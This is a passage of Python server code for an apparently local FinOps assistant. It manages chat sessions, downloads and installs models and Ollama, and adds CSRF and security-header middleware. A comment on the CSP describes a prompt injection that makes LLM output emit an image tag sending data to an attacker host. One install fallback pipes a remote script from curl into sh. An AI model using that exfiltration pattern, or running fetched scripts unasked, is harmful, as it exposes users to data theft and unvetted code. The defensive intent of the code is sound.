            p_lower = p.lower()
            break
    if p:
        p = p[0].upper() + p[1:]
    p = p.rstrip("?. ")
    return (p[:46] + "...") if len(p) > 46 else (p or "New Conversation")

def _get_active_session_id() -> Optional[str]:
    if not _sessions:
        return None
    sorted_sids = sorted(
        _sessions.keys(),
        key=lambda sid: _sessions[sid].get("updated_at", "") if isinstance(_sessions[sid], dict) else "",
        reverse=True
    )
    return sorted_sids[0] if sorted_sids else None

def _is_valid_guid(val: any) -> bool:
    if not val or not isinstance(val, str):
        return False
    try:
        val_obj = uuid.UUID(str(val))
        return str(val_obj) == str(val).lower()
    except Exception:
        return False

def _normalize_session(sid: str, sdata: any) -> dict:
    now = datetime.now(timezone.utc).isoformat()
    # Guarantee valid GUID for session id
    target_sid = sid if _is_valid_guid(sid) else str(uuid.uuid4())
    if isinstance(sdata, list):
        title = "New Conversation"
        for m in sdata:
            if m.get("role") == "user" and m.get("content"):
                title = _generate_chat_title(m["content"])
                break
        return {
            "id": target_sid,
            "title": title,
            "created_at": now,
            "updated_at": now,
            "messages": sdata,
            "pinned": False
        }
    elif isinstance(sdata, dict):
        if "messages" not in sdata or not isinstance(sdata["messages"], list):
            sdata["messages"] = []
        if not _is_valid_guid(sdata.get("id")):
            sdata["id"] = target_sid
        if "created_at" not in sdata:
            sdata["created_at"] = now
        if "updated_at" not in sdata:
            sdata["updated_at"] = sdata.get("created_at", now)
        if "title" not in sdata or not sdata["title"]:
            title = "New Conversation"
            for m in sdata.get("messages", []):
                if m.get("role") == "user" and m.get("content"):
                    title = _generate_chat_title(m["content"])
                    break
            sdata["title"] = title
        if "pinned" not in sdata:
            sdata["pinned"] = False
        return sdata
    return {
        "id": target_sid,
        "title": "New Conversation",
        "created_at": now,
        "updated_at": now,
        "messages": [],
        "pinned": False
    }

def _load_sessions() -> dict:
    sessions_file = os.environ.get("CLEO_SESSIONS_FILE", SESSIONS_CACHE_FILE)
    if os.path.exists(sessions_file):
        try:
            raw = load_encrypted_json(sessions_file, default={})
            if isinstance(raw, dict):
                normalized = {}
                needs_save = False
                for sid, sdata in raw.items():
                    target_sid = sid
                    if not _is_valid_guid(target_sid):
                        target_sid = str(uuid.uuid4())
                        needs_save = True
                    norm = _normalize_session(target_sid, sdata)
                    if norm.get("id") != target_sid:
                        norm["id"] = target_sid
                        needs_save = True
                    normalized[target_sid] = norm
                # Keep sorted by updated_at descending, up to MAX_SAVED_SESSIONS
                sorted_items = sorted(
                    normalized.items(),
                    key=lambda item: item[1].get("updated_at", "") if isinstance(item[1], dict) else "",
                    reverse=True
                )
                res = dict(sorted_items[:MAX_SAVED_SESSIONS])
                if needs_save:
                    try:
                        save_encrypted_json(sessions_file, res)
                    except Exception as e:
                        logger.debug(f"Could not auto-save updated GUID sessions: {e}")
                return res
        except Exception as e:
            logger.warning(f"Could not load sessions cache: {e}")
    return {}

def _save_sessions():
    global _sessions
    if os.environ.get("CLEO_TESTING") == "1" or os.environ.get("PYTEST_CURRENT_TEST"):
        return
    sessions_file = os.environ.get("CLEO_SESSIONS_FILE", SESSIONS_CACHE_FILE)
    try:
        sorted_items = sorted(
            _sessions.items(),
            key=lambda item: item[1].get("updated_at", "") if isinstance(item[1], dict) else "",
            reverse=True
        )
        if len(sorted_items) > MAX_SAVED_SESSIONS:
            _sessions = dict(sorted_items[:MAX_SAVED_SESSIONS])
        save_encrypted_json(sessions_file, _sessions)
    except Exception as e:
        logger.warning(f"Could not save sessions cache: {e}")

_sessions: dict        = _load_sessions()
_ephemeral_sessions: dict = {}  # In-memory session store for ephemeral/test runs (never persisted to disk)
# ponytail: query-result caching is handled at MCPClient._query_cache (cleo_mcp.py:~380) — no duplicate cache needed here
_server_start          = datetime.now(timezone.utc).isoformat()
_active_engine_key     = _init_engine_key
_engine_label          = _init_engine_label
_model_downloads: dict = {}  # model_id -> {"status": "downloading"|"completed"|"failed", "progress": 0, "error": ""}
_oauth_verifiers: dict = {}  # state -> {verifier, client_id, redirect_uri}
_last_error: str       = ""

VERIFIER_CACHE_FILE = os.path.expanduser("~/.cleo/pkce_verifier.json")

def _format_bytes(b: int) -> str:
    """Formats byte count to human-readable string (KB, MB, GB)."""
    if b >= 1024 ** 3:
        return f"{b / (1024 ** 3):.2f} GB"
    elif b >= 1024 ** 2:
        return f"{b / (1024 ** 2):.1f} MB"
    elif b >= 1024:
        return f"{round(b / 1024)} KB"
    return f"{b} B"

def _get_hf_blobs_size(repo_id: str) -> int:
    """Calculates the total size of downloaded blobs on disk for an HF repo."""
    try:
        hf_cache = os.environ.get("HUGGINGFACE_HUB_CACHE") or os.path.expanduser(
            os.path.join(os.environ.get("HF_HOME", "~/.cache/huggingface"), "hub")
        )
        repo_folder = f"models--{repo_id.replace('/', '--')}"
        blobs_dir = os.path.join(hf_cache, repo_folder, "blobs")
        if not os.path.isdir(blobs_dir):
            return 0
        total = 0
        with os.scandir(blobs_dir) as it:
            for entry in it:
                try:
                    if entry.is_file(follow_symlinks=False) and not entry.name.endswith(".lock"):
                        total += entry.stat().st_size
                except OSError:
                    pass
        return total
    except Exception:
        return 0

def _bg_pull_mlx_model(repo_id: str):
    global _model_downloads
    _model_downloads[repo_id] = {
        "status": "downloading",
        "progress": 1,
        "status_detail": "Connecting to Hugging Face...",
        "error": ""
    }

    # 1. Determine total size in bytes
    total_bytes = 0
    try:
        from huggingface_hub import HfApi
        api = HfApi()
        info = api.model_info(repo_id, files_metadata=True, timeout=5.0)
        total_bytes = sum(s.size for s in (info.siblings or []) if s.size)
    except Exception as e:
        logger.debug(f"[MLX Download] Could not get model metadata for {repo_id}: {e}")

    if not total_bytes or total_bytes <= 0:
        known_sizes = {
            "mlx-community/Qwen3.5-9B-MLX-4bit": 5977074591,
            "mlx-community/Qwen3.5-4B-4bit": 3061130647,
            "mlx-community/Qwen2.5-7B-Instruct-4bit": 4600000000,
            "mlx-community/Qwen2.5-Coder-32B-Instruct-4bit": 19800000000,
        }
        total_bytes = known_sizes.get(repo_id, int(3.0 * (1024 ** 3)))

    total_str = _format_bytes(total_bytes)
    _model_downloads[repo_id]["status_detail"] = f"Starting download ({total_str})..."

    # 2. Start snapshot_download in a background worker thread
    worker_error = []
    def _worker():
        try:
            from huggingface_hub import snapshot_download
            snapshot_download(repo_id=repo_id)
        except Exception as err:
            worker_error.append(err)

    thread = threading.Thread(target=_worker, daemon=True)
    thread.start()

    # 3. Sample disk progress in real-time while download proceeds
    last_bytes = _get_hf_blobs_size(repo_id)
    last_time = time.time()
    speed_mb = 0.0

    while thread.is_alive():
        time.sleep(0.4)
        curr_bytes = _get_hf_blobs_size(repo_id)
        now = time.time()
        dt = now - last_time

        if dt >= 0.8:
            diff = max(0, curr_bytes - last_bytes)
            instant_speed = (diff / (1024 * 1024)) / dt
            speed_mb = (0.7 * speed_mb) + (0.3 * instant_speed) if speed_mb > 0 else instant_speed
            last_bytes = curr_bytes
            last_time = now

        curr_str = _format_bytes(curr_bytes)
        pct = min(99.0, round((curr_bytes / total_bytes) * 100, 1)) if total_bytes > 0 else 5.0
        pct = max(1.0, pct)

        if speed_mb >= 0.1:
            detail = f"Downloading: {curr_str} / {total_str} ({speed_mb:.1f} MB/s)"
        elif curr_bytes > 0:
            detail = f"Downloading: {curr_str} / {total_str}"
        else:
            detail = "Downloading weights to local cache..."

        _model_downloads[repo_id] = {
            "status": "downloading",
            "progress": pct,
            "status_detail": detail,
            "error": ""
        }

    thread.join()

    if worker_error:
        err = worker_error[0]
        logger.error(f"❌ [MLX Download Failed] {repo_id}: {err}")
        _model_downloads[repo_id] = {
            "status": "failed",
            "progress": 0,
            "error": str(err),
            "status_detail": f"Failed: {err}"
        }
    else:
        logger.info(f"✅ [MLX Download Complete] {repo_id}")
        _model_downloads[repo_id] = {
            "status": "completed",
            "progress": 100,
            "status_detail": "Download complete",
            "error": ""
        }

def _check_ollama_alive() -> bool:
    global OLLAMA_BASE_URL
    candidates = [
        OLLAMA_BASE_URL,
        "http://127.0.0.1:11434",
        "http://localhost:11434"
    ]
    opener = get_ollama_opener()
    seen = set()
    for base in candidates:
        if not base or base in seen:
            continue
        seen.add(base)
        for ep in ["/api/tags", "/api/version", "/"]:
            try:
                req = urllib.request.Request(
                    f"{base}{ep}",
                    headers={"Accept": "application/json", "User-Agent": "Cleo-FinOps/1.0"}
                )
                with opener.open(req, timeout=1.5) as resp:
                    if resp.status in (200, 204):
                        if base != OLLAMA_BASE_URL:
                            logger.info(f"ℹ️ Connected to Ollama daemon at {base}")
                            OLLAMA_BASE_URL = base
                        return True
            except Exception:
                continue

    # Also probe TCP socket directly on loopback 11434
    for host in ["127.0.0.1", "localhost"]:
        try:
            with socket.create_connection((host, 11434), timeout=0.5):
                working_base = f"http://{host}:11434"
                if working_base != OLLAMA_BASE_URL:
                    OLLAMA_BASE_URL = working_base
                return True
        except Exception:
            pass

    return False

def _find_ollama_bin() -> Optional[str]:
    """Locates the Ollama executable on the system, checking PATH and common installation locations."""
    bin_name = "ollama.exe" if platform.system() == "Windows" else "ollama"
    found = shutil.which(bin_name)
    if found and os.path.isfile(found) and (platform.system() == "Windows" or os.access(found, os.X_OK)):
        return found

    home = os.path.expanduser("~")
    candidates = []
    if platform.system() == "Darwin":
        candidates = [
            "/opt/homebrew/bin/ollama",
            "/usr/local/bin/ollama",
            os.path.join(home, "Applications", "Ollama.app", "Contents", "Resources", "ollama"),
            "/Applications/Ollama.app/Contents/Resources/ollama",
            os.path.join(home, ".local", "bin", "ollama"),
        ]
    elif platform.system() == "Linux":
        candidates = [
            os.path.join(home, ".local", "bin", "ollama"),
            "/usr/local/bin/ollama",
            "/usr/bin/ollama",
            "/bin/ollama",
        ]
    elif platform.system() == "Windows":
        local_app = os.environ.get("LOCALAPPDATA", os.path.join(home, "AppData", "Local"))
        prog_files = os.environ.get("ProgramFiles", "C:\\Program Files")
        candidates = [
            os.path.join(local_app, "Programs", "Ollama", "ollama.exe"),
            os.path.join(home, "AppData", "Local", "Programs", "Ollama", "ollama.exe"),
            os.path.join(prog_files, "Ollama", "ollama.exe"),
        ]

    for cand in candidates:
        if os.path.isfile(cand) and (platform.system() == "Windows" or os.access(cand, os.X_OK)):
            return cand
    return None

def _start_ollama_daemon(timeout: float = 25.0) -> bool:
    """Spawns Ollama daemon in the background if not already running."""
    if _check_ollama_alive():
        logger.info(f"✅ Ollama daemon is already active ({OLLAMA_BASE_URL}).")
        return True

    # Check if port 11434 is already bound by an existing process (e.g. Windows background service)
    port_in_use = False
    for host in ["127.0.0.1", "localhost"]:
        try:
            with socket.create_connection((host, 11434), timeout=0.5):
                port_in_use = True
                break
        except Exception:
            pass

    if port_in_use:
        logger.info("ℹ️ Port 11434 is already in use (Ollama daemon is running in background). Verifying...")
        time.sleep(1.0)
        if _check_ollama_alive():
            logger.info("✅ Ollama daemon verified.")
            return True

    bin_path = _find_ollama_bin()
    if not bin_path:
        logger.warning("⚠️ Ollama executable not found on system PATH or default locations.")
        return False

    logger.info(f"🚀 Starting Ollama daemon ({bin_path} serve)...")
    try:
        if platform.system() == "Windows":
            si = subprocess.STARTUPINFO()
            si.dwFlags |= getattr(subprocess, "STARTF_USESHOWWINDOW", 0x00000001)
            si.wShowWindow = 0  # SW_HIDE
            subprocess.Popen(
                [bin_path, "serve"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                startupinfo=si,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
            )
        else:
            subprocess.Popen(
                [bin_path, "serve"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
    except Exception as e:
        logger.error(f"❌ Failed to spawn Ollama daemon: {e}")
        return False

    t0 = time.time()
    while time.time() - t0 < timeout:
        if _check_ollama_alive():
            logger.info("✅ Ollama daemon started successfully.")
            return True
        time.sleep(0.5)

    # Final check: is port in use and listening?
    for host in ["127.0.0.1", "localhost"]:
        try:
            with socket.create_connection((host, 11434), timeout=0.5):
                logger.info(f"✅ Ollama daemon reachable on {host}:11434.")
                return True
        except Exception:
            pass

    logger.warning(f"⚠️ Timed out after {timeout}s waiting for Ollama daemon to respond.")
    return False

_OLLAMA_SHA256_URL = "https://github.com/ollama/ollama/releases/latest/download/sha256sum.txt"

def _verify_ollama_download(path: str, asset_name: str) -> tuple[bool, str]:
    """Check a downloaded Ollama artifact against the release's published SHA-256 list.
    Fails closed: if the checksum list is unreachable or lacks the asset, the install is refused.
    (Guards against corruption and in-path tampering; it can't help if the release itself is compromised.)"""
    import hashlib
    try:
        req = urllib.request.Request(_OLLAMA_SHA256_URL, headers={"User-Agent": "Cleo-FinOps/2.1"})
        with urllib.request.urlopen(req, timeout=30) as resp:
            listing = resp.read().decode("utf-8", "replace")
    except Exception as e:
        return False, f"Could not fetch Ollama checksums to verify the download: {e}"
    expected = None
    for line in listing.splitlines():
        parts = line.split()
        if len(parts) == 2 and os.path.basename(parts[1]) == asset_name:
            expected = parts[0].lower()
            break
    if not expected:
        return False, f"No published checksum for {asset_name}; refusing to install."
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    if h.hexdigest() != expected:
        return False, f"Checksum mismatch for {asset_name} (expected {expected[:12]}…, got {h.hexdigest()[:12]}…). Retry, or install Ollama manually from https://ollama.com/download"
    return True, ""

def _install_ollama(status_cb=None) -> tuple[bool, str]:
    """Downloads and installs Ollama without requiring sudo."""
    system = platform.system()
    home = os.path.expanduser("~")
    cache_dir = os.path.join(home, ".cleo", "cache")
    os.makedirs(cache_dir, exist_ok=True)

    if status_cb:
        status_cb(5, "Downloading Ollama CLI...")

    if system == "Darwin":
        zip_path = os.path.join(cache_dir, "Ollama-darwin.zip")
        url = "https://ollama.com/download/Ollama-darwin.zip"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Cleo-FinOps/1.0)"})
            with urllib.request.urlopen(req, timeout=180.0) as resp:
                total_size = int(resp.headers.get("Content-Length", 0))
                downloaded = 0
                chunk_size = 65536
                with open(zip_path, "wb") as f:
                    while True:
                        chunk = resp.read(chunk_size)
                        if not chunk:
                            break
                        f.write(chunk)
                        downloaded += len(chunk)
                        if status_cb and total_size > 0:
                            pct = round((downloaded / total_size) * 100, 1)
                            mb_cur = round(downloaded / (1024 * 1024), 1)
                            mb_tot = round(total_size / (1024 * 1024), 1)
                            status_cb(round(5 + (pct * 0.7), 1), f"Downloading Ollama ({mb_cur}/{mb_tot} MB)...")
        except Exception as e:
            return False, f"Failed to download Ollama package: {e}"

        ok, err = _verify_ollama_download(zip_path, "Ollama-darwin.zip")
        if not ok:
            try: os.remove(zip_path)
            except OSError: pass
            return False, err

        if status_cb:
            status_cb(80, "Extracting Ollama...")

        apps_dir = os.path.join(home, "Applications")
        os.makedirs(apps_dir, exist_ok=True)
        res = subprocess.run(["/usr/bin/ditto", "-xk", zip_path, apps_dir], capture_output=True, text=True)
        if res.returncode != 0:
            res = subprocess.run(["unzip", "-q", "-o", zip_path, "-d", apps_dir], capture_output=True, text=True)
            if res.returncode != 0:
                return False, f"Failed to extract Ollama: {res.stderr or 'Extraction error'}"

        installed_bin = os.path.join(apps_dir, "Ollama.app", "Contents", "Resources", "ollama")
        if not os.path.isfile(installed_bin):
            return False, "Ollama binary not found in extracted app bundle."

        try:
            os.chmod(installed_bin, 0o755)
            local_bin = os.path.join(home, ".local", "bin")
            os.makedirs(local_bin, exist_ok=True)
            symlink = os.path.join(local_bin, "ollama")
            if os.path.islink(symlink) or os.path.exists(symlink):
                os.remove(symlink)
            os.symlink(installed_bin, symlink)
        except Exception as e:
            logger.warning(f"Could not symlink to ~/.local/bin: {e}")

        try:
            os.remove(zip_path)
        except Exception:
            pass

        if status_cb:
            status_cb(95, "Ollama CLI installed successfully.")
        return True, ""

    elif system == "Linux":
        arch = "arm64" if platform.machine().lower() in ("arm64", "aarch64") else "amd64"
        tar_zst_path = os.path.join(cache_dir, f"ollama-linux-{arch}.tar.zst")
        url = f"https://github.com/ollama/ollama/releases/latest/download/ollama-linux-{arch}.tar.zst"
        local_dir = os.path.join(home, ".local")
        bin_dir = os.path.join(local_dir, "bin")
        os.makedirs(bin_dir, exist_ok=True)

        # 1. Download release archive directly
        try:
            if status_cb:
                status_cb(10, f"Downloading Ollama Linux ({arch})...")
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Cleo-FinOps/1.0)"})
            with urllib.request.urlopen(req, timeout=180.0) as resp:
                total_size = int(resp.headers.get("Content-Length", 0))
                downloaded = 0
                chunk_size = 65536
                with open(tar_zst_path, "wb") as f:
                    while True:
                        chunk = resp.read(chunk_size)
                        if not chunk:
                            break
                        f.write(chunk)
                        downloaded += len(chunk)
                        if status_cb and total_size > 0:
                            pct = round((downloaded / total_size) * 100, 1)
                            mb_cur = round(downloaded / (1024 * 1024), 1)
                            mb_tot = round(total_size / (1024 * 1024), 1)
                            status_cb(round(10 + (pct * 0.65), 1), f"Downloading Ollama ({mb_cur}/{mb_tot} MB)...")
        except Exception as e:
            logger.warning(f"Direct download of Ollama archive failed: {e}")
            # Fallback to install script ONLY if non-interactive sudo is available or root
            if os.geteuid() == 0:
                try:
                    if status_cb:
                        status_cb(30, "Running official install script (root mode)...")
                    subprocess.run(
                        ["sh", "-c", "curl -fsSL https://ollama.com/install.sh | sh"],
                        capture_output=True, text=True, timeout=120, stdin=subprocess.DEVNULL
                    )
                    if _find_ollama_bin():
                        return True, ""
                except Exception:
                    pass
            return False, f"Failed to download Ollama package: {e}"

        ok, err = _verify_ollama_download(tar_zst_path, f"ollama-linux-{arch}.tar.zst")
        if not ok:
            try: os.remove(tar_zst_path)
            except OSError: pass
            return False, err

        # 2. Extract into ~/.local (non-sudo user space)
        if status_cb:
            status_cb(80, "Extracting Ollama into ~/.local...")

        extracted = False
        # Try method A: system zstd + tar
        try:
            # No shell: pipe zstd into tar directly so paths are never interpreted by `sh`
            zproc = subprocess.Popen(["zstd", "-d", tar_zst_path, "--stdout"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            res = subprocess.run(["tar", "-xf", "-", "-C", local_dir], stdin=zproc.stdout, capture_output=True, timeout=60)
            zproc.stdout.close()
            if zproc.wait(timeout=60) == 0 and res.returncode == 0:
                extracted = True
        except Exception:
            pass

        # Try method B: tar with --zstd
        if not extracted:
            try:
                res = subprocess.run(
                    ["tar", "--zstd", "-xf", tar_zst_path, "-C", local_dir],
                    capture_output=True, text=True, timeout=60
                )
                if res.returncode == 0:
                    extracted = True
            except Exception:
                pass

        # Try method C: Python zstandard package
        if not extracted:
            try:
                import zstandard as zstd
            except ImportError:
                if status_cb:
                    status_cb(82, "Installing decompression helper...")
                for extra_flag in [["--break-system-packages"], ["--user", "--break-system-packages"], []]:
                    res = subprocess.run(
                        [sys.executable, "-m", "pip", "install"] + extra_flag + ["zstandard", "-q"],
                        capture_output=True, timeout=45
                    )
                    if res.returncode == 0:
                        break
                try:
                    import zstandard as zstd
                except ImportError:
                    zstd = None

            if zstd:
                try:
                    import tarfile
                    if not hasattr(tarfile, "data_filter"):
                        raise RuntimeError("tarfile lacks extraction filters (upgrade Python); refusing unfiltered extraction")
                    dctx = zstd.ZstdDecompressor()
                    with open(tar_zst_path, "rb") as ifh:
                        with dctx.stream_reader(ifh) as reader:
                            with tarfile.open(fileobj=reader, mode="r|") as tar:
                                # Security: filter="data" rejects path traversal, absolute paths, links and devices
                                tar.extractall(path=local_dir, filter="data")
                    extracted = True
                except Exception as ze:
                    logger.warning(f"Python zstandard extraction failed: {ze}")

        # Clean up temporary archive file
        try:
            os.remove(tar_zst_path)
        except Exception:
            pass

        installed_bin = os.path.join(bin_dir, "ollama")
        if not os.path.isfile(installed_bin):
            cand = _find_ollama_bin()
            if cand:
                installed_bin = cand
            else:
                return False, "Ollama binary could not be extracted (requires zstd or python zstandard library)."

        try:
            os.chmod(installed_bin, 0o755)
        except Exception:
            pass

        if status_cb:
            status_cb(95, "Ollama CLI installed successfully.")
        return True, ""

    elif system == "Windows":
        installer_path = os.path.join(cache_dir, "OllamaSetup.exe")
        url = "https://ollama.com/download/OllamaSetup.exe"
        try:
            urllib.request.urlretrieve(url, installer_path)
            ok, err = _verify_ollama_download(installer_path, "OllamaSetup.exe")
            if not ok:
                try: os.remove(installer_path)
                except OSError: pass
                return False, err
            if status_cb:
                status_cb(50, "Running Ollama installer...")
            res = subprocess.run([installer_path, "/silent"], capture_output=True, timeout=180)
            if _find_ollama_bin():
                return True, ""
        except Exception as e:
            return False, f"Windows installer failed: {e}"
        return False, "Please install Ollama from https://ollama.com/download"

    return False, f"Unsupported OS platform: {system}"

def _bg_pull_model(model_name: str):
    global _model_downloads
    _model_downloads[model_name] = {
        "status": "downloading",
        "progress": 0,
        "status_detail": "Checking Ollama service...",
        "error": ""
    }

    # 1. Ensure Ollama service is active (installing and starting if needed)
    if not _check_ollama_alive():
        ollama_bin = _find_ollama_bin()
        if not ollama_bin:
            logger.info("Ollama binary not found. Starting automatic installation...")
            def _install_status(pct: float, msg: str):
                _model_downloads[model_name]["progress"] = round(pct * 0.15, 1)
                _model_downloads[model_name]["status_detail"] = msg

            ok, err_msg = _install_ollama(status_cb=_install_status)
            if not ok:
                logger.error(f"❌ [Ollama Install Failed]: {err_msg}")
                _model_downloads[model_name] = {
                    "status": "failed",
                    "progress": 0,
                    "error": err_msg,
                    "status_detail": f"Install failed: {err_msg}"
                }
                return

        _model_downloads[model_name]["progress"] = 15
        _model_downloads[model_name]["status_detail"] = "Starting Ollama service..."
        started = _start_ollama_daemon()
        if not started:
            err = "Failed to start Ollama daemon ('ollama serve')"
            logger.error(f"❌ {err}")
            _model_downloads[model_name] = {
                "status": "failed",
                "progress": 0,
                "error": err,
                "status_detail": err
            }
            return

    # 2. Pull the model weights from Ollama
    _model_downloads[model_name]["status_detail"] = f"Connecting to Ollama to pull '{model_name}'..."
    url = f"{OLLAMA_BASE_URL}/api/pull"
    payload = json.dumps({"name": model_name, "stream": True}).encode("utf-8")
    req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
    opener = get_ollama_opener()
    try:
        with opener.open(req, timeout=1800.0) as resp:
            for line in resp:
                if not line:
                    continue
                try:
                    chunk = json.loads(line.decode("utf-8"))
                    if "error" in chunk:
                        err_msg = chunk["error"]
                        if model_name.startswith("hf.co/") and ("manifest" in err_msg.lower() or "file does not exist" in err_msg.lower() or "not found" in err_msg.lower()):
                            err_msg += " (Ollama 0.3.12+ required for hf.co models; select 'qwen2.5:3b' instead)"
                        logger.error(f"❌ [Ollama Pull Error] Model '{model_name}': {err_msg}")
                        _model_downloads[model_name] = {
                            "status": "failed",
                            "progress": 0,
                            "error": err_msg,
                            "status_detail": f"Failed: {err_msg}"
                        }
                        return

                    completed = chunk.get("completed", 0)
                    total = chunk.get("total", 0)
                    status_text = chunk.get("status", "")
                    if total > 0:
                        raw_pct = (completed / total) * 100
                        scaled_pct = round(15 + (raw_pct * 0.84), 1)
                        _model_downloads[model_name]["progress"] = min(99.0, scaled_pct)
                        comp_str = _format_bytes(completed)
                        tot_str = _format_bytes(total)
                        _model_downloads[model_name]["status_detail"] = f"Downloading: {comp_str} / {tot_str}"
                    elif status_text:
                        _model_downloads[model_name]["status_detail"] = status_text
                    if status_text == "success":
                        success_seen = True
                        _model_downloads[model_name]["status"] = "completed"
                        _model_downloads[model_name]["progress"] = 100
                        _model_downloads[model_name]["status_detail"] = "Download complete"
                except Exception:
                    pass

        if not success_seen:
            existing_err = _model_downloads[model_name].get("error")
            err_msg = existing_err or "Ollama download stream ended before completion"
            logger.error(f"❌ [Ollama Download Incomplete] Model '{model_name}': {err_msg}")
            _model_downloads[model_name] = {
                "status": "failed",
                "progress": 0,
                "error": err_msg,
                "status_detail": f"Failed: {err_msg}"
            }
            return

        _model_downloads[model_name]["status"] = "completed"
        _model_downloads[model_name]["progress"] = 100
        _model_downloads[model_name]["status_detail"] = "Download complete"
        logger.info(f"✅ [Ollama Download Complete] Model '{model_name}' successfully downloaded!")
    except Exception as e:
        logger.error(f"❌ [Ollama Download Failed] Model '{model_name}': {e}")
        _model_downloads[model_name] = {"status": "failed", "progress": 0, "error": str(e), "status_detail": f"Failed: {e}"}

def _save_pending_verifier(state: str, info: dict):
    global _oauth_verifiers
    _oauth_verifiers[state] = info
    try:
        save_encrypted_json(VERIFIER_CACHE_FILE, _oauth_verifiers)
    except Exception:
        pass

def _load_pending_verifiers() -> dict:
    return load_encrypted_json(VERIFIER_CACHE_FILE, default={})

# ── CSRF Protection: reject cross-origin state-changing requests ──────────────
# Cleo is a local single-user server with no auth layer; without this, any web
# page the user visits in a browser could silently POST/DELETE to it (e.g.
# overwrite API keys via /api/tokens) using the browser's ambient access.
_MUTATING_METHODS = {"POST", "PUT", "DELETE", "PATCH"}

# Legacy n8n-compat endpoints change server state on GET (kept for existing workflows). Browsers
# tag fetches/subresources with Sec-Fetch-Site, so a cross-site <img src=".../start?model=openai">
# is rejected, while server-to-server callers (n8n, curl) send no such header and still work.
_STATE_CHANGING_GET_PATHS = {"/start", "/stop", "/stop_all"}

@app.middleware("http")
async def csrf_protection(request: Request, call_next):
    if request.method == "GET" and request.url.path in _STATE_CHANGING_GET_PATHS:
        if request.headers.get("sec-fetch-site", "same-origin") not in ("same-origin", "none"):
            logger.warning(f"[CSRF] Rejected cross-site GET {request.url.path}")
            return JSONResponse(status_code=403, content={"detail": "Cross-site requests are not allowed."})
    if request.method in _MUTATING_METHODS:
        origin = request.headers.get("origin")
        if origin:
            origin_host = origin.split("://", 1)[-1].rstrip("/")
            request_host = request.headers.get("host", "")
            if origin_host != request_host:
                logger.warning(
                    f"[CSRF] Rejected cross-origin {request.method} {request.url.path} "
                    f"(Origin={origin!r}, Host={request_host!r})"
                )
                return JSONResponse(status_code=403, content={"detail": "Cross-origin requests are not allowed."})
    return await call_next(request)

# ── Content-Security-Policy for HTML pages ────────────────────────────────────
# The UI renders LLM output over data that tenants control (resource names, tags), so a prompt
# injection could emit <img src="https://attacker/?q=<data>"> to exfiltrate it. img-src/connect-src
# lock egress to this origin. Inline scripts/styles stay allowed because the UI is a single file
# with inline handlers; CDN scripts and Google Fonts are the only external resources it loads.
_CSP = (
    "default-src 'self'; "
    "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
    "font-src 'self' data: https://fonts.gstatic.com; "
    "img-src 'self' data: blob:; "
    "connect-src 'self'; "
    "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'"
)

@app.middleware("http")
async def security_headers(request: Request, call_next):
    response = await call_next(request)
    if response.headers.get("content-type", "").startswith("text/html"):
        response.headers.setdefault("Content-Security-Policy", _CSP)
        response.headers.setdefault("X-Content-Type-Options", "nosniff")
    return response

# ── HTTP Request Logging Middleware ───────────────────────────────────────────
@app.middleware("http")
async def log_requests(request: Request, call_next):
    start = time.time()
    path = request.url.path
    query = request.url.query
    full_path = f"{path}?{query}" if query else path
    is_poll = path in ("/health", "/api/logs", "/favicon.ico")
    if not is_poll:
        logger.debug(f"[HTTP IN]  {request.method} {full_path}")
    try:
        response = await call_next(request)
        dur_ms = round((time.time() - start) * 1000, 1)
        if not is_poll:
            logger.debug(f"[HTTP OUT] {request.method} {full_path} -> {response.status_code} ({dur_ms}ms)")
        return response
    except Exception as e:
        dur_ms = round((time.time() - start) * 1000, 1)
        logger.error(f"[HTTP ERR] {request.method} {full_path} -> {e} ({dur_ms}ms)")
        raise

def init_mcp_if_authenticated() -> bool:
    """Attempts to connect to CloudHealth MCP with stored access token."""
    global _mcp, _tools, _ai, _active_engine_key, _engine_label, _last_error
    token = get_access_token(interactive=False)
    if not token:
        logger.debug("[MCP Init Check] No CloudHealth access token found in storage")
        _mcp = None
        _tools = []
        _last_error = ""
        return False
    try:
        logger.info("[MCP Init] Initializing CloudHealth connection with stored access token...")
        _mcp = MCPClient(token, token_refresher=lambda: get_access_token(interactive=False))
        info = _mcp.initialize()
        _tools = _mcp.list_tools()
        threading.Thread(target=crawl_and_cache_all_datasource_metadata, args=(_mcp,), daemon=True).start()
        
        cfg = _load_config()
        sys_info = detect_system_info()
        is_apple_silicon = sys_info["is_apple_silicon"]
        rec_engine = sys_info["recommended_engine_id"]

        if is_apple_silicon:
            mlx_inst = get_installed_mlx_models()
            ready_mlx = {m["repo_id"]: m for m in mlx_inst if m.get("downloaded")}
            if "mlx-community/Qwen3.5-9B-MLX-4bit" in ready_mlx:
                default_engine = "mlx:mlx-community/Qwen3.5-9B-MLX-4bit"
            elif "mlx-community/Qwen2.5-7B-Instruct-4bit" in ready_mlx:
                default_engine = "mlx:mlx-community/Qwen2.5-7B-Instruct-4bit"
            elif ready_mlx:
                default_engine = f"mlx:{list(ready_mlx.keys())[0]}"
            else:
                default_engine = rec_engine
        else:
            default_engine = rec_engine or "ollama:qwen2.5:7b"

        engine_key = cfg.get("AI_ENGINE") or os.environ.get("AI_ENGINE", default_engine)
        if not is_apple_silicon and engine_key.startswith("mlx:"):
            logger.info(f"[Engine] MLX engine '{engine_key}' not supported on {sys_info['os_display']}. Falling back to '{default_engine}'.")
            engine_key = default_engine
        _active_engine_key = engine_key
        
        if engine_key in AI_ENGINES:
            _engine_label = AI_ENGINES[engine_key][0]
        elif engine_key.startswith("mlx:"):
            _engine_label = f"{engine_key.removeprefix('mlx:').split('/')[-1]} (MLX)"
        elif engine_key.startswith("ollama:"):
            _engine_label = f"Ollama ({engine_key.split(':', 1)[1]})"
        else:
            pe = next((p for p in PUBLIC_ENGINES if p["id"] == engine_key), None)
            _engine_label = pe["name"] if pe else engine_key

